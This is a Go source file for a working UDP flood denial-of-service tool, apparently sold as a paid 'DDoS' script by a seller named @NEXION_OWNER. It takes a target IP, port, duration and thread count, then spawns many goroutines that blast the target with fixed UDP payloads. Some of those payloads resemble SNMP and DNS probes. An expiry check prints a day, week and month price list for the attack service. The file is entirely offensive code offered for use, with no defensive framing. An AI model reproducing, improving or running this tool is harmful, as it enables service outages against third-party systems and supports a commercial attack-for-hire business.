package main

import (
	"fmt"
	"net"
	"os"
	"strconv"
	"sync"
	"time"
)

func usage() {
fmt.Println("")
fmt.Println("PAID SCRIPT BY :- @NEXION_OWNER")
fmt.Println("SCRIPT OWNED BY @NEXION_OWNER")

fmt.Println("")
	fmt.Println("Usage: ./nexion {ip} {port} {time} {threads optional}\n")
	os.Exit(1)
}

// Check for expiration
func checkExpiration() {
	expirationDate := time.Date(2024, time.October, 3, 0, 0, 0, 0, time.UTC)
	if time.Now().After(expirationDate) {
		fmt.Println("\nThe script has expired and cannot be run.\n")
		fmt.Println("▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
	   fmt.Println("REAL SEALLER @NEXION_OWNER")
	   fmt.Println("▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
	   fmt.Println("\n    ❄️ PAID DDOS PRICE.❄️")
	   fmt.Println("")

	   fmt.Println("         DAY ₹99")
	   fmt.Println("        WEEK ₹399")
	   fmt.Println("       MONTH ₹1199")
	   fmt.Println("")
	   fmt.Println("▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
	   fmt.Println("SCRIPT MADE AND OWNED BY @NEXION_OWNER")
	   fmt.Println("▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
		os.Exit(1)
	}
}

func attack(ip string, port int, duration int, wg *sync.WaitGroup, stop chan struct{}) {
	defer wg.Done()

	conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", ip, port))
	if err != nil {
		fmt.Println("Error creating socket:", err)
		return
	}
	defer conn.Close()

	payloads := [][]byte{
		[]byte("\xd9\x00"), []byte("\x00\x00"), []byte("\xd9\x00\x00"),
		[]byte("\x72\xfe\x1d\x13\x00\x00"), []byte("\x30\x3a\x02\x01\x03\x30\x0f\x02\x02\x4a\x69\x02\x03\x00\x00"),
		[]byte("\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00"),
	}

	endTime := time.Now().Add(time.Duration(duration) * time.Second)

	for time.Now().Before(endTime) {
		select {
		case <-stop:
			return
		default:
			for _, payload := range payloads {
				_, err := conn.Write(payload)
				if err != nil {
					fmt.Println("Error sending packet:", err)
					return
				}
			}
		}
	}
}

func main() {
	if len(os.Args) < 4 || len(os.Args) > 5 {
		usage()
	}

	checkExpiration() // Check for expiration

	ip := os.Args[1]
	port, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("Invalid port.")
		return
	}
	duration, err := strconv.Atoi(os.Args[3])
	if err != nil {
		fmt.Println("Invalid time duration.")
		return
	}
	threads := 60 // Default to 60 threads
	if len(os.Args) == 5 {
		threads, err = strconv.Atoi(os.Args[4])
		if err != nil {
			fmt.Println("Invalid number of threads.")
			return
		}
	}

	fmt.Println("▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
	fmt.Println("☠️ ATTACK START ☠️")
	fmt.Printf("       IP: %s\n", ip)
	fmt.Printf("       PORT: %d\n", port)
	fmt.Printf("       TIME: %d seconds\n", duration)
	fmt.Printf("       THREADS: %d\n", threads)
	fmt.Println("▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")

	var wg sync.WaitGroup
	stop := make(chan struct{})

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go attack(ip, port, duration, &wg, stop)
	}

	wg.Wait()
	fmt.Println("▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
	fmt.Println("     Attack finished")
	fmt.Println("▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
}
